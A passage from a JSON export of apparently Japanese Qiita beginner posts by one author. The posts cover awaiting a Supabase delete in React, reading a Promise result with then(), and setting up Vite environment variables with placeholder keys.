class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"k\">await</span> <span class=\"nf\">deleteData</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">);</span>\n    <span class=\"nf\">getDatas</span><span class=\"p\">();</span>\n  <span class=\"p\">};</span>\n</code></pre></div>\n</div>\n<ol data-sourcepos=\"62:1-65:0\">\n<li data-sourcepos=\"62:1-62:157\">deleteData(id);にawaitを適用して完全にデータ削除処理が終わるのを待ってもらってから、getAllDatas();を呼ぶように修正</li>\n<li data-sourcepos=\"63:1-65:0\">getAllDatas();もawaitを適用、完全にデータを取得する処理が終わるのを待ってから、useStateでsetするように修正</li>\n</ol>\n<h1 data-sourcepos=\"66:1-66:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"67:1-68:60\">講師の方に質問したところ爆速で解決しました。<br>\n身近に有識者がいるのは本当にありがたい。</p>\n<h1 data-sourcepos=\"70:1-70:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"71:1-71:63\">カレーの例えが非常にわかりやすかったです。</p>\n<p data-sourcepos=\"73:1-73:52\"><iframe id=\"qiita-embed-content__7cbd785aeccb0b9bd06b078044123660\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7cbd785aeccb0b9bd06b078044123660\" data-content=\"https%3A%2F%2Fzenn.dev%2Fsingularity%2Farticles%2F360d69fde8322d\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n削除機能を実装中に再表示で削除したデータが表示される事象に詰まってしまったため、備忘録として記事にします。\n\n# 問題\n削除ボタン押下後もデータが表示されたまま、リロードをすると消える状態\n![レコーディング 2025-02-20 200056.gif](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ed718043-5a64-453b-88ad-02dc482c6ddc.gif)\n\nDBでは該当データが消えることを確認\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f1267434-39a8-4d43-a91d-7a573406738c.png)\n\nこの時のコード\n```react:App.jsx\nconst [records, setRecords] = useState([]);\n// 削除ボタン押下\nconst onClickDelete = (id) => {\n    deleteData(id);\n    // 削除後のデータを全件取得する\n    const datas =  getAllDatas();\n    datas.then((data) => {setRecords(data)});\n};\n```\n\ndeleteData(id);の処理が完了する前に、const datas =  getAllDatas();の処理が走っていたことが原因でした。\n\n```javascript:supabaseFunctions.js\nimport { supabase } from \"./spabase\"\n\nexport const getAllDatas = async() => {\n  const datas = await supabase.from(\"study-record\").select(\"*\"); \n  return datas.data;\n};\n\nexport const deleteData = async(props) => {\n  const response = await supabase.from(\"study-record\").delete().eq('id', props)\n};\n```\n\n# 解決方法\n### async awaitを使う\n\n参考記事より引用\n>async とは?\nasync を関数の前に付けることで、その関数は非同期であることを示します。\n関数（プログラムのまとまり）の前に async を付けると、「この関数の中には、終わるのを待たなければいけない作業があるかも」とプログラムに教えることができます。\n\n>await とは?\nawait を使うと、「この作業が終わるのを待つよ」という指示が出せます。await は必ず async 関数の中で使用する必要があります。\n\n```reactApp.jsx\n  const [records, setRecords] = useState([]);\n  const getDatas =  async() => {\n    const datas = await getAllDatas();\n    setRecords(datas);\n  }\n  // 削除ボタン押下\n  const onClickDelete = async (id) => {\n    await deleteData(id);\n    getDatas();\n  };\n```\n\n1. deleteData(id);にawaitを適用して完全にデータ削除処理が終わるのを待ってもらってから、getAllDatas();を呼ぶように修正\n2. getAllDatas();もawaitを適用、完全にデータを取得する処理が終わるのを待ってから、useStateでsetするように修正\n\n\n# おわりに\n講師の方に質問したところ爆速で解決しました。\n身近に有識者がいるのは本当にありがたい。\n\n# 参考\nカレーの例えが非常にわかりやすかったです。\n\nhttps://zenn.dev/singularity/articles/360d69fde8322d\n","coediting":false,"comments_count":0,"created_at":"2025-02-20T21:05:25+09:00","group":null,"id":"4c5c6d2367d18e4e922b","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"JavaScript","versions":[]},{"name":"初心者","versions":[]},{"name":"React","versions":[]}],"title":"【async await】delete後の再表示で削除したデータが表示される","updated_at":"2025-02-20T21:05:25+09:00","url":"https://qiita.com/asa129/items/4c5c6d2367d18e4e922b","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":707,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:117\">DBから取得した結果がPromiseのオブジェクトで返却されたとき、取得方法に困りました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-6:122\">Promiseで返却されるPrimiseResultのみを取得したかった。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa7e68c27-06f6-4535-9c3e-bf63dafe7e8a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0a957a51bcd75bf99c1fd1d6213c6f31\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa7e68c27-06f6-4535-9c3e-bf63dafe7e8a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0a957a51bcd75bf99c1fd1d6213c6f31\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa7e68c27-06f6-4535-9c3e-bf63dafe7e8a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1013f0f40f09614b7a9b3641cd1afe76 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a7e68c27-06f6-4535-9c3e-bf63dafe7e8a.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"8:1-8:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"9:1-9:18\">then()を使う。</p>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"10:1-16:3\"><div class=\"highlight\"><pre><code>  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">records</span><span class=\"p\">,</span> <span class=\"nx\">setRecords</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">([]);</span>\n  <span class=\"nf\">useEffect</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">datas</span> <span class=\"o\">=</span>  <span class=\"nf\">getAllDatas</span><span class=\"p\">();</span>\n    <span class=\"nx\">datas</span><span class=\"p\">.</span><span class=\"nf\">then</span><span class=\"p\">((</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span><span class=\"nf\">setRecords</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)});</span>\n  <span class=\"p\">},</span> <span class=\"p\">[]);</span>\n</code></pre></div></div>\n<p data-sourcepos=\"17:1-17:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd73fe8a5-0497-4efe-bfc8-0a8b6bf0abfa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=cab0bdb244f80801bcd78644e75177bd\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd73fe8a5-0497-4efe-bfc8-0a8b6bf0abfa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=cab0bdb244f80801bcd78644e75177bd\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd73fe8a5-0497-4efe-bfc8-0a8b6bf0abfa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=b6c80dd57c9eefbc355d232be3069d65 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d73fe8a5-0497-4efe-bfc8-0a8b6bf0abfa.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"20:1-20:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"21:1-22:48\">「PromiseResult 取得」でGoogle検索したところ解決しました。<br>\n検索の仕方も学んでいきたいです。</p>\n<h1 data-sourcepos=\"24:1-24:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"26:1-26:50\"><iframe id=\"qiita-embed-content__c3075650815832b588cafc4ba1a9619b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__c3075650815832b588cafc4ba1a9619b\" data-content=\"https%3A%2F%2Fsbfl.net%2Fblog%2F2019%2F11%2F04%2Fpromise-cookbook%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nDBから取得した結果がPromiseのオブジェクトで返却されたとき、取得方法に困りました。\n\n# 問題\nPromiseで返却されるPrimiseResultのみを取得したかった。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a7e68c27-06f6-4535-9c3e-bf63dafe7e8a.png)\n\n# 解決方法\nthen()を使う。\n```react\n  const [records, setRecords] = useState([]);\n  useEffect(() => {\n    const datas =  getAllDatas();\n    datas.then((data) => {setRecords(data)});\n  }, []);\n```\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d73fe8a5-0497-4efe-bfc8-0a8b6bf0abfa.png)\n\n\n# おわりに\n「PromiseResult 取得」でGoogle検索したところ解決しました。\n検索の仕方も学んでいきたいです。\n\n# 参考\n\nhttps://sbfl.net/blog/2019/11/04/promise-cookbook/\n","coediting":false,"comments_count":2,"created_at":"2025-02-19T18:20:33+09:00","group":null,"id":"0951637e1107c6313c4f","likes_count":2,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"JavaScript","versions":[]}],"title":"PromiseResultのみを取得したい","updated_at":"2025-02-19T22:15:10+09:00","url":"https://qiita.com/asa129/items/0951637e1107c6313c4f","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":987,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:119\">supabaseのDB情報をViteで使用する際、環境変数設定方法について調べたことをまとめます。</p>\n<h1 data-sourcepos=\"4:1-4:29\">\n<span id=\"実現したかったこと\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E7%8F%BE%E3%81%97%E3%81%9F%E3%81%8B%E3%81%A3%E3%81%9F%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>実現したかったこと</h1>\n<p data-sourcepos=\"5:1-5:44\">supabaseのDB情報をViteで使用する。</p>\n<h1 data-sourcepos=\"7:1-7:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"8:1-8:55\">①dotenvとdotenv-expandをインストールする。</p>\n<blockquote data-sourcepos=\"10:1-11:125\">\n<p data-sourcepos=\"10:2-11:125\">Vite は、環境ディレクトリーにある以下のファイルから追加の環境変数を読み込むために dotenv を利用します。<br>\nまた、Vite は dotenv-expand を使って、設定不要で env ファイルに書かれた変数を展開できます。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"13:1-17:3\"><div class=\"highlight\"><pre><code>npm init -y\nnpm i dotenv\nnpm i dotenv-expand\n</code></pre></div></div>\n<p data-sourcepos=\"19:1-20:122\">node_modules配下にインストールされていることを確認<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4e783e5d-2d3f-4698-bfbd-3d51ea2f25fa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=34a017f62406ec16aa3b0a18aa6c436d\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4e783e5d-2d3f-4698-bfbd-3d51ea2f25fa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=34a017f62406ec16aa3b0a18aa6c436d\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4e783e5d-2d3f-4698-bfbd-3d51ea2f25fa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=4d1d6209c41642b6f00b5b7cc30c3e56 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/4e783e5d-2d3f-4698-bfbd-3d51ea2f25fa.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"23:1-23:77\">①supabaseのドキュメントから、Initializingのソースをコピー</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"25:1-30:3\">\n<div class=\"code-lang\"><span class=\"bold\">spabase.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">createClient</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">@supabase/supabase-js</span><span class=\"dl\">'</span>\n\n<span class=\"c1\">// Create a single supabase client for interacting with your database</span>\n<span class=\"kd\">const</span> <span class=\"nx\">supabase</span> <span class=\"o\">=</span> <span class=\"nf\">createClient</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">https://xyzcompany.supabase.co</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"dl\">'</span><span class=\"s1\">public-anon-key</span><span class=\"dl\">'</span><span class=\"p\">)</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"32:1-33:122\">②外部環境変数ファイル(.env.local)を作成<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74b741d0-0e3d-4176-8e6d-7ad9b872d044.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=32d0e81ca2a487091d3f8185951423af\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74b741d0-0e3d-4176-8e6d-7ad9b872d044.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=32d0e81ca2a487091d3f8185951423af\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74b741d0-0e3d-4176-8e6d-7ad9b872d044.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=868df89af940daad428429b6b12c770f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/74b741d0-0e3d-4176-8e6d-7ad9b872d044.png\" loading=\"lazy\"></a></p>\n<blockquote data-sourcepos=\"35:1-36:197\">\n<p data-sourcepos=\"35:2-35:184\">環境変数が誤ってクライアントに漏れてしまうことを防ぐために、VITE_ から始まる変数のみが Vite で処理されたコードに公開されます。</p>\n<blockquote data-sourcepos=\"36:2-36:197\">\n<p data-sourcepos=\"36:3-36:197\">例えば、以下の環境変数だとVITE_SOME_KEY だけが import.meta.env.VITE_SOME_KEY としてクライアントソースコードに公開され、DB_PASSWORD は公開されません。</p>\n</blockquote>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"37:1-40:3\">\n<div class=\"code-lang\"><span class=\"bold\">.env</span></div>\n<div class=\"highlight\"><pre><code><span class=\"nv\">VITE_SOME_KEY</span><span class=\"o\">=</span>123\n<span class=\"nv\">DB_PASSWORD</span><span class=\"o\">=</span>foobar\n</code></pre></div>\n</div>\n<p data-sourcepos=\"41:1-41:74\">とのことなので、環境変数の最初にVITE_をつけました。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"42:1-45:3\">\n<div class=\"code-lang\"><span class=\"bold\">.env.local</span></div>\n<div class=\"highlight\"><pre><code>VITE_NEXT_PUBLIC_SUPABASE_URL=hogehoge\nVITE_NEXT_PUBLIC_SUPABASE_ANON_KEY=hogehoge\n</code></pre></div>\n</div>\n<p data-sourcepos=\"49:1-49:75\">③環境変数ファイルを読み込むように①のソースを修正</p>\n<blockquote data-sourcepos=\"52:1-52:98\">\n<p data-sourcepos=\"52:2-52:98\">Vite は特定の定数を特別な import.meta.env オブジェクトの下で公開します。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"54:1-60:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">createClient</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">@supabase/supabase-js</span><span class=\"dl\">'</span>\n\n<span class=\"c1\">// Create a single supabase client for interacting with your database</span>\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">supabase</span> <span class=\"o\">=</span> <span class=\"nf\">createClient</span><span class=\"p\">(</span>\n  <span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VITE_NEXT_PUBLIC_SUPABASE_URL</span><span class=\"p\">,</span> <span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VITE_NEXT_PUBLIC_SUPABASE_ANON_KEY</span><span class=\"p\">)</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"63:1-63:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"64:1-64:99\">ドキュメントを見つつ、試行錯誤してできたときの喜びは癖になりそう。</p>\n<h1 data-sourcepos=\"66:1-66:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<h4 data-sourcepos=\"67:1-67:60\">\n<span id=\"環境変数とはdotenvdotenv-expandについて\" class=\"fragment\"></span><a href=\"#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%81%A8%E3%81%AFdotenvdotenv-expand%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\"><i class=\"fa fa-link\"></i></a>環境変数とは、dotenv、dotenv-expandについて</h4>\n<p data-sourcepos=\"68:1-68:123\">こちらの記事を読みつつ試すだけで、環境変数の理解度がかなり上がったと感じています。</p>\n<p data-sourcepos=\"70:1-70:46\"><iframe id=\"qiita-embed-content__a3b00b09196088d03a28fdacccc5d79a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a3b00b09196088d03a28fdacccc5d79a\" data-content=\"https%3A%2F%2Ffor.kobayashiii.dev%2Farticles%2Fnqbaxkkf8\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"72:1-72:31\">\n<span id=\"supabaseドキュメント\" class=\"fragment\"></span><a href=\"#supabase%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88\"><i class=\"fa fa-link\"></i></a>supabaseドキュメント</h4>\n<p data-sourcepos=\"74:1-74:59\"><iframe id=\"qiita-embed-content__a326ebe87349dfab3d5f927668ea6b24\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a326ebe87349dfab3d5f927668ea6b24\" data-content=\"https%3A%2F%2Fsupabase.com%2Fdocs%2Freference%2Fjavascript%2Finitializing\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"76:1-76:27\">\n<span id=\"viteドキュメント\" class=\"fragment\"></span><a href=\"#vite%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88\"><i class=\"fa fa-link\"></i></a>Viteドキュメント</h4>\n<p data-sourcepos=\"78:1-78:43\"><iframe id=\"qiita-embed-content__9d9af0d9dff26c1f6c60d7006784eb44\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__9d9af0d9dff26c1f6c60d7006784eb44\" data-content=\"https%3A%2F%2Fja.vite.dev%2Fguide%2Fenv-and-mode.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"80:1-80:94\">\n<span id=\"supabaseの環境変数設定について具体的に実装されている動画です\" class=\"fragment\"></span><a href=\"#supabase%E3%81%AE%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E8%A8%AD%E5%AE%9A%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E5%85%B7%E4%BD%93%E7%9A%84%E3%81%AB%E5%AE%9F%E8%A3%85%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E5%8B%95%E7%94%BB%E3%81%A7%E3%81%99\"><i class=\"fa fa-link\"></i></a>supabaseの環境変数設定について具体的に実装されている動画です。</h4>\n<p data-sourcepos=\"82:1-82:43\"><iframe id=\"qiita-embed-content__79830d814fbd1a0c83941152bbc73b26\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__79830d814fbd1a0c83941152bbc73b26\" data-content=\"https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DCZlZgRo0bZ4\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nsupabaseのDB情報をViteで使用する際、環境変数設定方法について調べたことをまとめます。\n\n# 実現したかったこと\nsupabaseのDB情報をViteで使用する。\n\n# 解決方法\n①dotenvとdotenv-expandをインストールする。\n\n>Vite は、環境ディレクトリーにある以下のファイルから追加の環境変数を読み込むために dotenv を利用します。\n>また、Vite は dotenv-expand を使って、設定不要で env ファイルに書かれた変数を展開できます。\n\n```\nnpm init -y\nnpm i dotenv\nnpm i dotenv-expand\n```\n\nnode_modules配下にインストールされていることを確認\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/4e783e5d-2d3f-4698-bfbd-3d51ea2f25fa.png)\n\n\n①supabaseのドキュメントから、Initializingのソースをコピー\n\n```javascript:spabase.js\nimport { createClient } from '@supabase/supabase-js'\n\n// Create a single supabase client for interacting with your database\nconst supabase = createClient('https://xyzcompany.supabase.co', 'public-anon-key')\n```\n\n②外部環境変数ファイル(.env.local)を作成\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/74b741d0-0e3d-4176-8e6d-7ad9b872d044.png)\n\n>環境変数が誤ってクライアントに漏れてしまうことを防ぐために、VITE_ から始まる変数のみが Vite で処理されたコードに公開されます。\n>>例えば、以下の環境変数だとVITE_SOME_KEY だけが import.meta.env.VITE_SOME_KEY としてクライアントソースコードに公開され、DB_PASSWORD は公開されません。\n```.env\nVITE_SOME_KEY=123\nDB_PASSWORD=foobar\n```\nとのことなので、環境変数の最初にVITE_をつけました。\n```.env.local\nVITE_NEXT_PUBLIC_SUPABASE_URL=hogehoge\nVITE_NEXT_PUBLIC_SUPABASE_ANON_KEY=hogehoge\n```\n\n\n\n③環境変数ファイルを読み込むように①のソースを修正\n\n\n>Vite は特定の定数を特別な import.meta.env オブジェクトの下で公開します。\n\n```javascript\nimport { createClient } from '@supabase/supabase-js'\n\n// Create a single supabase client for interacting with your database\nexport const supabase = createClient(\n  import.meta.env.VITE_NEXT_PUBLIC_SUPABASE_URL, import.meta.env.VITE_NEXT_PUBLIC_SUPABASE_ANON_KEY)\n```\n\n\n# おわりに\nドキュメントを見つつ、試行錯誤してできたときの喜びは癖になりそう。\n\n# 参考\n#### 環境変数とは、dotenv、dotenv-expandについて\nこちらの記事を読みつつ試すだけで、環境変数の理解度がかなり上がったと感じています。\n\nhttps://for.kobayashiii.dev/articles/nqbaxkkf8\n\n#### supabaseドキュメント\n\nhttps://supabase.com/docs/reference/javascript/initializing\n\n#### Viteドキュメント\n\nhttps://ja.vite.dev/guide/env-and-mode.html\n\n#### supabaseの環境変数設定について具体的に実装されている動画です。\n\nhttps://www.youtube.com/watch?v=CZlZgRo0bZ4\n","coediting":false,"comments_count":0,"created_at":"2025-02-18T19:04:55+09:00","group":null,"id":"a28392147b3cba6429c2","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"初心者","versions":[]},{"name":"環境変数","versions":[]},{"name":"vite","versions":[]}],"title":"【Vite】.envファイルから環境変数を設定する","updated_at":"2025-02-18T19:04:55+09:00","url":"https://qiita.com/asa129/items/a28392147b3cba6429c2","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":754,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:135\">ドキュメントを読んでいて下記の「gitには無視される」がよくわからなかったため、実験しました。</p>\n<blockquote data-sourcepos=\"3:1-4:82\">\n<p data-sourcepos=\"3:2-4:82\">.env               # 全ての場合に読み込まれる<br>\n.env.local          # 全ての場合に読み込まれ、gitには無視される</p>\n</blockquote>\n<p data-sourcepos=\"6:1-6:53\"><iframe id=\"qiita-embed-content__04ecce038e426c3518cb69708594128e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__04ecce038e426c3518cb69708594128e\" data-content=\"https%3A%2F%2Fja.vite.dev%2Fguide%2Fenv-and-mode.html%23env-files\" 